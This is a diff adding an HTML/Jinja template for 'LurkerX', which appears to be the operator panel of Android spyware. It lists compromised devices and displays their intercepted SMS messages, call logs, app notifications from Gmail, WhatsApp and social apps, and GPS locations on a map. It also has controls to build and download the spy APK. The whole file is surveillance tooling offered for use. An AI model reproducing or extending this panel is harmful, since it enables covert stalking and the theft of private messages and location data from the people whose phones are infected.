@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+  <style>
+:root {
+  --bg: #0f172a;
+  --panel: #111827;
+  --panel-2: #1f2937;
+  --border: #1f2937;
+  --text: #e5e7eb;
+  --text-dim: #9ca3af;
+  --accent: #10b981;
+  --accent-2: #22d3ee;
+  --danger: #ef4444;
+}
+
+.login-error {
+  color: var(--danger);
+  font-size: 0.85rem;
+  margin-top: 12px;
+  min-height: 1.2em;
+  text-align: center;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  font-family: "Consolas", "Fira Code", "Segoe UI", monospace;
+  background: var(--bg);
+  color: var(--text);
+  display: flex;
+  height: 100vh;
+}
+
+.sidebar {
+  width: 280px;
+  background: var(--panel);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+}
+.sidebar-header {
+  padding: 20px;
+  border-bottom: 1px solid var(--border);
+}
+.sidebar-header h2 {
+  margin: 0;
+  font-size: 1rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  color: var(--accent);
+  text-transform: uppercase;
+}
+.sidebar-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+}
+.device-item {
+  padding: 10px 12px;
+  color: var(--text);
+  cursor: pointer;
+  border-radius: 6px;
+  transition: all 0.15s;
+  margin-bottom: 4px;
+  font-size: 0.9rem;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.device-item:hover {
+  background: rgba(34, 211, 238, 0.08);
+  color: var(--accent-2);
+}
+.device-item.active {
+  background: rgba(34, 211, 238, 0.12);
+  color: var(--accent-2);
+  border-left: 2px solid var(--accent-2);
+}
+.device-item .material-icons-round {
+  font-size: 18px;
+  color: var(--text-dim);
+}
+.device-item.active .material-icons-round {
+  color: var(--accent-2);
+}
+
+.date-section {
+  margin-top: 16px;
+  padding-top: 12px;
+  border-top: 1px solid var(--border);
+}
+.date-section label {
+  display: block;
+  color: var(--text-dim);
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 8px;
+}
+.date-section input[type="date"] {
+  width: 100%;
+  padding: 10px;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  background: var(--bg);
+  color: var(--text);
+  font-family: inherit;
+  font-size: 0.9rem;
+  outline: none;
+  transition: border-color 0.15s;
+}
+.date-section input[type="date"]:focus {
+  border-color: var(--accent-2);
+}
+
+.sidebar-footer {
+  padding: 16px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.sidebar-footer .btn-row {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+.sidebar-footer .btn-row .btn {
+  flex: 1 1 auto;
+  min-width: 0;
+  width: auto;
+}
+.btn {
+  width: 100%;
+  padding: 10px;
+  border: none;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.15s;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+.btn .material-icons-round {
+  font-size: 16px;
+}
+.btn-primary {
+  background: var(--accent);
+  color: #000;
+}
+.btn-primary:hover:not(:disabled) {
+  background: #34d399;
+}
+.btn-primary:disabled {
+  background: #374151;
+  color: var(--text-dim);
+  cursor: not-allowed;
+}
+.btn-secondary {
+  background: transparent;
+  color: var(--accent);
+  border: 1px solid var(--accent);
+}
+.btn-secondary:hover:not(:disabled) {
+  background: rgba(16, 185, 129, 0.1);
+}
+.btn-secondary:disabled {
+  opacity: 0.4;
+  cursor: not-allowed;
+}
+.build-status {
+  font-size: 0.75rem;
+  color: var(--text-dim);
+  text-align: center;
+  min-height: 1.2em;
+}
+
+.main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+.topbar {
+  padding: 20px 24px;
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+.topbar h1 {
+  margin: 0 0 16px 0;
+  font-size: 1.1rem;
+  font-weight: 600;
+  color: var(--text);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+}
+.control-buttons {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+.control-buttons .btn {
+  width: auto;
+  flex: 0 0 auto;
+}
+.filter-buttons {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 12px;
+}
+.filter-buttons .btn {
+  width: auto;
+  flex: 0 0 auto;
+}
+
+.board-scroll {
+  flex: 1;
+  overflow-y: auto;
+  padding: 24px;
+}
+.board-content {
+  max-width: 900px;
+}
+.board-content > p {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+}
+
+.card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  margin-bottom: 12px;
+  transition: border-color 0.15s;
+}
+.card:hover {
+  border-color: rgba(34, 211, 238, 0.2);
+}
+.card-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 10px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+  font-weight: 600;
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--accent-2);
+}
+.card-header .material-icons-round {
+  font-size: 18px;
+}
+.card-row {
+  display: flex;
+  padding: 6px 0;
+  font-size: 0.85rem;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+.card-row:last-child {
+  border-bottom: none;
+}
+.card-label {
+  width: 140px;
+  color: var(--text-dim);
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  flex-shrink: 0;
+}
+.card-value {
+  flex: 1;
+  color: var(--text);
+  word-break: break-word;
+}
+
+.section-title {
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--text-dim);
+  margin: 20px 0 12px 0;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+
+.filter-buttons {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 12px;
+}
+.filter-btn {
+  padding: 6px 12px;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  background: transparent;
+  color: var(--text);
+  cursor: pointer;
+  font-family: inherit;
+  font-size: 0.8rem;
+  transition: all 0.15s;
+}
+.filter-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+}
+
+.card-actions {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 12px;
+}
+.gps-map {
+  background: var(--panel-2);
+}
+
+.spinner-container {
+  position: fixed;
+  top: 16px;
+  right: 16px;
+  z-index: 1000;
+  display: none;
+}
+.spinner {
+  width: 32px;
+  height: 32px;
+  border: 3px solid var(--panel-2);
+  border-top: 3px solid var(--accent);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.login-box {
+  max-width: 420px;
+  margin: 60px auto;
+  padding: 32px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+}
+.login-box h1 {
+  margin: 0 0 8px 0;
+  font-size: 1.3rem;
+  color: var(--accent-2);
+}
+.login-box p {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+  margin: 0 0 20px 0;
+}
+.login-box input {
+  width: 100%;
+  padding: 12px;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  background: var(--bg);
+  color: var(--text);
+  font-family: inherit;
+  margin-bottom: 12px;
+  outline: none;
+}
+.login-box input:focus {
+  border-color: var(--accent-2);
+}
+.login-box button {
+  width: 47%;
+  margin: 0.8%;
+  padding: 12px;
+  border: none;
+  border-radius: 6px;
+  background: var(--accent);
+  color: #000;
+  cursor: pointer;
+  font-family: inherit;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.login-box .token-btn {
+  background: var(--accent-2);
+}
+.login-box button:hover {
+  background: #34d399;
+}
+.login-error {
+  color: var(--danger);
+  font-size: 0.85rem;
+  margin-top: 12px;
+  min-height: 1.2em;
+}
+  </style>
+</head>
+
+<body>
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <h2>LurkerX</h2>
+    </div>
+    <div class="sidebar-body">
+      <div id="device-list"></div>
+      <div class="date-section" id="date-section" style="display:none;">
+        <label for="date-select">Date</label>
+        <input type="date" id="date-select" />
+      </div>
+    </div>
+    <div class="sidebar-footer">
+      <div class="btn-row">
+        <button id="build-docker-btn" class="btn waves-effect waves-light" style="background: var(--accent); color: #000;">
+          <span class="material-icons-round left">build</span>
+          Build APK (DOCKER)
+        </button>
+        <button id="build-github-btn" class="btn waves-effect waves-light" style="background: transparent; color: var(--accent); border: 1px solid var(--accent);">
+          <span class="material-icons-round left">cloud_sync</span>
+          Build APK (GITHUB CI)
+        </button>
+      </div>
+      <a id="download-apk-link" class="btn waves-effect waves-light" href="/download_apk" style="background: transparent; color: var(--accent); border: 1px solid var(--accent);">
+        <span class="material-icons-round left">download</span>
+        Download App
+      </a>
+      <div id="build-status" class="build-status"></div>
+    </div>
+  </div>
+
+  <div class="main">
+    {% if unauthorized %}
+    <div class="topbar" style="justify-content: center; display: flex;">
+      <div class="card" style="max-width: 420px; width: 100%;">
+        <div class="card-content">
+          <div class="center-align" style="margin-bottom: 24px;">
+            <span class="material-icons-round" style="font-size: 48px; color: var(--accent-2); display: block; margin-bottom: 12px;">verified_user</span>
+            <h1 style="margin: 0 0 8px 0; font-size: 1.5rem; color: var(--accent-2);">LurkerX Panel</h1>
+            <p style="color: var(--text-dim); font-size: 0.9rem; margin: 0;">Enter your token to access the panel.</p>
+          </div>
+          <div class="input-field">
+            <input id="token-input" type="text" placeholder="Encrypted token" />
+            <label for="token-input">Encrypted Token</label>
+          </div>
+          <div style="display: flex; gap: 12px; margin-top: 24px;">
+            <button id="login-btn" class="btn waves-effect waves-light" style="flex: 1; background: var(--accent); color: #000;">
+              <span class="material-icons-round left">lock_open</span>
+              Unlock Panel
+            </button>
+            <button id="token-btn" class="btn waves-effect waves-light" style="flex: 1; background: var(--accent-2); color: #000;">
+              <span class="material-icons-round left">vpn_key</span>
+              Get New Token
+            </button>
+          </div>
+          <p id="login-error" class="login-error"></p>
+        </div>
+      </div>
+    </div>
+    {% else %}
+    <div class="topbar">
+      <h1>Dashboard</h1>
+      <div class="control-buttons">
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('sms')">
+          <span class="material-icons-round left">sms</span>SMS
+        </button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('calls')">
+          <span class="material-icons-round left">call</span>Calls
+        </button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('notifs')">
+          <span class="material-icons-round left">notifications</span>Notifications
+        </button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border);" onclick="loadType('gps')">
+          <span class="material-icons-round left">location_on</span>GPS
+        </button>
+      </div>
+      <div class="filter-buttons">
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.facebook.katana')">Facebook</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.instagram.android')">Instagram</button>
+        <button class="btn waves-effect waves-light" style="background: transparent; color: var(--text); border: 1px solid var(--border); font-size: 0.8rem; padding: 6px 12px;" onclick="filterNotifications('com.twitter.android')">X</button>
+      </div>
+    </div>
+    <div class="board-scroll">
+      <div id="board-content" class="board-content">
+        <p>Select a device and date from the sidebar, then use the buttons above to view logs.</p>
+      </div>
+    </div>
+    {% endif %}
+  </div>
+
+  <div class="spinner-container" id="spinner-container">
+    <div class="spinner"></div>
+  </div>
+
+  {% if unauthorized %}
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      M.updateTextFields();
+      var dateEl = document.getElementById('date-select');
+      if (dateEl && M.Datepicker) {
+        M.Datepicker.init(dateEl, { format: 'yyyy-mm-dd', autoClose: true });
+      }
+    });
+
+    document.getElementById("login-btn").addEventListener("click", function () {
+      const token = document.getElementById("token-input").value.trim();
+      const errorEl = document.getElementById("login-error");
+      errorEl.style.display = "none";
+      const btn = document.getElementById("login-btn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="material-icons-round left">hourglass_empty</span>Unlocking...';
+
+      fetch("/validate_token", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: token }),
+      })
+      .then((res) => {
+        if (res.ok) {
+          window.location.reload();
+        } else {
+          btn.disabled = false;
+          btn.innerHTML = '<span class="material-icons-round left">lock_open</span>Unlock Panel';
+          return res.json().then((data) => { throw new Error(data.error || "Invalid token"); });
+        }
+      })
+      .catch((err) => {
+        errorEl.textContent = err.message;
+        errorEl.style.display = "block";
+      });
+    });
+
+    document.getElementById("token-btn").addEventListener("click", ()=> {
+      window.location.href = "https://web-token-page.onrender.com";
+    });
+  </script>
+  {% endif %}
+  <script>
+    const structure = {{ structure | tojson }};
+    const deviceListEl = document.getElementById("device-list");
+    const dateSection = document.getElementById("date-section");
+    const dateSelect = document.getElementById("date-select");
+    const boardContent = document.getElementById("board-content");
+    const spinnerContainer = document.getElementById("spinner-container");
+
+    let selectedDevice = null;
+
+    function renderDevices() {
+      deviceListEl.innerHTML = "";
+      Object.keys(structure).forEach(device => {
+        const div = document.createElement("div");
+        div.className = "device-item";
+        div.innerHTML = `<span class="material-icons-round">smartphone</span>${device}`;
+        div.addEventListener("click", () => selectDevice(device, div));
+        deviceListEl.appendChild(div);
+      });
+    }
+
+    function selectDevice(device, el) {
+      selectedDevice = device;
+      document.querySelectorAll(".device-item").forEach(item => item.classList.remove("active"));
+      el.classList.add("active");
+      dateSection.style.display = "block";
+      fetch(`/api/devices/${encodeURIComponent(device)}/dates`)
+        .then(res => res.json())
+        .then(data => {
+          dateSelect.value = "";
+          if (data.dates && data.dates.length) {
+            dateSelect.value = data.dates[0];
+          }
+        })
+        .catch(() => {
+          dateSelect.value = "";
+        });
+    }
+
+    dateSelect.addEventListener("change", () => {
+      const date = dateSelect.value;
+      if (!date || !selectedDevice) return;
+      boardContent.innerHTML = '<p style="color: var(--text-dim);">Date changed. Use buttons above to load logs.</p>';
+    });
+
+    function loadType(type) {
+      if (!selectedDevice) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a device first.</p>';
+        return;
+      }
+      const date = dateSelect.value;
+      if (!date) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a date first.</p>';
+        return;
+      }
+      spinnerContainer.style.display = "block";
+      boardContent.innerHTML = "";
+      const url = `/get_info/${type}?date=${encodeURIComponent(date)}`;
+      fetch(url, { headers: { "C-Device": selectedDevice } })
+        .then(res => res.json())
+        .then(data => {
+          const items = data.data || [];
+          if (!items.length) {
+            boardContent.innerHTML = '<p style="color: var(--text-dim);">No records found for this date.</p>';
+            return;
+          }
+          renderCards(type, items);
+        })
+        .catch(err => {
+          console.error("Error loading", type, err);
+          boardContent.innerHTML = '<p style="color: var(--danger);">Failed to load.</p>';
+        })
+        .finally(() => {
+          spinnerContainer.style.display = "none";
+        });
+    }
+
+    function renderCards(type, items) {
+      boardContent.innerHTML = "";
+      const section = document.createElement("div");
+      section.className = "section-title";
+      section.textContent = `${type.toUpperCase()} (${items.length})`;
+      boardContent.appendChild(section);
+
+      items.forEach(item => {
+        const card = document.createElement("div");
+        card.className = "card";
+        let rows = "";
+        if (type === "sms") {
+          rows = [
+            { label: "Address", value: item.address || "Unknown" },
+            { label: "Body", value: item.body },
+            { label: "Date", value: new Date(item.date).toLocaleString() },
+            { label: "Type", value: item.type },
+          ];
+        } else if (type === "calls") {
+          rows = [
+            { label: "Number", value: item.number || "Unknown" },
+            { label: "Duration", value: (item.duration || 0) + "s" },
+            { label: "Date", value: new Date(item.timestamp).toLocaleString() },
+            { label: "Type", value: item.call_type || item.type || "Unknown" },
+          ];
+        } else if (type === "notifs") {
+          rows = [
+            { label: "Package", value: item.package || "Unknown" },
+            { label: "Title", value: item.title || "(no title)" },
+            { label: "Text", value: item.text || "(empty)" },
+            { label: "Ongoing", value: item.is_ongoing ? "Yes" : "No" },
+            { label: "Time", value: new Date(item.timestamp).toLocaleString() },
+          ];
+        } else if (type === "gps") {
+          rows = [
+            { label: "Latitude", value: item.latitude },
+            { label: "Longitude", value: item.longitude },
+            { label: "Accuracy", value: item.accuracy ? item.accuracy + "m" : "Unknown" },
+            { label: "Altitude", value: item.altitude ? item.altitude + "m" : "Unknown" },
+            { label: "Speed", value: item.speed ? item.speed + "m/s" : "Unknown" },
+            { label: "Time", value: new Date(item.timestamp).toLocaleString() },
+          ];
+        }
+        card.innerHTML = rows.map(r =>
+          `<div class="card-row"><div class="card-label">${r.label}</div><div class="card-value">${r.value}</div></div>`
+        ).join("");
+        if (type === "gps") {
+          const lat = parseFloat(item.latitude);
+          const lon = parseFloat(item.longitude);
+          const mapId = "gps-map-" + Math.random().toString(36).slice(2, 9);
+          const gmUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+          const actions = document.createElement("div");
+          actions.className = "card-actions";
+          actions.innerHTML = `
+            <button class="control-btn" onclick="toggleGpsMap('${mapId}', ${lat}, ${lon})">
+              <span class="material-icons-round">map</span> View GPS
+            </button>
+            <a class="control-btn" href="${gmUrl}" target="_blank" rel="noopener">
+              <span class="material-icons-round">open_in_new</span> Google Maps
+            </a>
+          `;
+          const mapContainer = document.createElement("div");
+          mapContainer.id = mapId;
+          mapContainer.className = "gps-map";
+          mapContainer.style.display = "none";
+          mapContainer.style.height = "220px";
+          mapContainer.style.marginTop = "10px";
+          mapContainer.style.borderRadius = "6px";
+          mapContainer.style.border = "1px solid var(--border)";
+          card.appendChild(actions);
+          card.appendChild(mapContainer);
+        }
+        boardContent.appendChild(card);
+      });
+    }
+
+    function toggleGpsMap(mapId, lat, lon) {
+      const container = document.getElementById(mapId);
+      if (!container) return;
+      if (container.style.display === "none") {
+        container.style.display = "block";
+        if (!container._leafletMap) {
+          const map = L.map(mapId).setView([lat, lon], 14);
+          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+            attribution: "&copy; OpenStreetMap"
+          }).addTo(map);
+          L.marker([lat, lon]).addTo(map).bindPopup(`<b>Location</b><br>${lat.toFixed(6)}, ${lon.toFixed(6)}`).openPopup();
+          container._leafletMap = map;
+        } else {
+          container._leafletMap.invalidateSize();
+        }
+      } else {
+        container.style.display = "none";
+      }
+    }
+
+    function filterNotifications(packageName) {
+      if (!selectedDevice) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a device first.</p>';
+        return;
+      }
+      const date = dateSelect.value;
+      if (!date) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a date first.</p>';
+        return;
+      }
+      spinnerContainer.style.display = "block";
+      fetch(`/get_info/notifs?date=${encodeURIComponent(date)}`, { headers: { "C-Device": selectedDevice } })
+        .then(res => res.json())
+        .then(data => {
+          const notifs = data.data || [];
+          const filtered = notifs.filter(n => n.package === packageName);
+          if (!filtered.length) {
+            boardContent.innerHTML = `<p style="color: var(--text-dim);">No notifications found for ${packageName}.</p>`;
+            return;
+          }
+          renderCards("notifs", filtered);
+        })
+        .catch(err => {
+          console.error("Error loading notifications:", err);
+          boardContent.innerHTML = '<p style="color: var(--danger);">Failed to load notifications.</p>';
+        })
+        .finally(() => {
+          spinnerContainer.style.display = "none";
+        });
+    }
+
+    renderDevices();
+  </script>
+  {% if not unauthorized %}
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      M.updateTextFields();
+    });
+  </script>
+  <script>
+    document.getElementById("build-docker-btn").addEventListener("click", function () {
+      const btn = document.getElementById("build-docker-btn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Building...';
+      fetch("/build_apk", { method: "POST" })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status !== "building") {
+            btn.disabled = false;
+            btn.innerHTML = '<span class="material-icons-round">build</span>Build APK (DOCKER)';
+          }
+        })
+        .catch(() => {
+          btn.disabled = false;
+          btn.innerHTML = '<span class="material-icons-round">build</span>Build APK (DOCKER)';
+        });
+    });
+
+    document.getElementById("build-github-btn").addEventListener("click", function () {
+      const btn = document.getElementById("build-github-btn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Build in progress';
+      fetch("/download_generated_app", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ repo_url: "" })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === "done") {
+          window.location.href = "/download_apk";
+        } else {
+          throw new Error(data.error || "Failed");
+        }
+      })
+      .catch(err => {
+        alert("Build failed: " + err.message);
+      })
+      .finally(() => {
+        btn.disabled = false;
+        btn.innerHTML = '<span class="material-icons-round">cloud_sync</span>Build APK (GITHUB CI)';
+      });
+    });
+
+    setInterval(() => {
+      fetch("/build_status")
+        .then(res => res.json())
+        .then(data => {
+          const dockerBtn = document.getElementById("build-docker-btn");
+          const githubBtn = document.getElementById("build-github-btn");
+          const link = document.getElementById("download-apk-link");
+          const status = document.getElementById("build-status");
+          if (data.status === "building") {
+            dockerBtn.disabled = true;
+            dockerBtn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Build in progress';
+            githubBtn.disabled = true;
+            githubBtn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Build in progress';
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.4";
+            status.textContent = "Build in progress";
+            status.style.color = "var(--accent)";
+          } else if (data.status === "error") {
+            dockerBtn.disabled = false;
+            dockerBtn.innerHTML = '<span class="material-icons-round">build</span>Build APK (DOCKER)';
+            githubBtn.disabled = false;
+            githubBtn.innerHTML = '<span class="material-icons-round">cloud_sync</span>Build APK (GITHUB CI)';
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.4";
+            status.textContent = "Build failed";
+            status.style.color = "var(--danger)";
+          } else if (data.apk_exists) {
+            dockerBtn.disabled = false;
+            dockerBtn.innerHTML = '<span class="material-icons-round">build</span>Build APK (DOCKER)';
+            githubBtn.disabled = false;
+            githubBtn.innerHTML = '<span class="material-icons-round">cloud_sync</span>Build APK (GITHUB CI)';
+            link.style.pointerEvents = "auto";
+            link.style.opacity = "1";
+            status.textContent = "App is ready";
+            status.style.color = "var(--accent)";
+          } else {
+            dockerBtn.disabled = false;
+            dockerBtn.innerHTML = '<span class="material-icons-round">build</span>Build APK (DOCKER)';
+            githubBtn.disabled = false;
+            githubBtn.innerHTML = '<span class="material-icons-round">cloud_sync</span>Build APK (GITHUB CI)';
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.4";
+            status.textContent = "APK not built yet";
+            status.style.color = "var(--text-dim)";
+          }
+        });
+    }, 2000);
+  </script>
+  {% endif %}
+</body>
+
+</html>
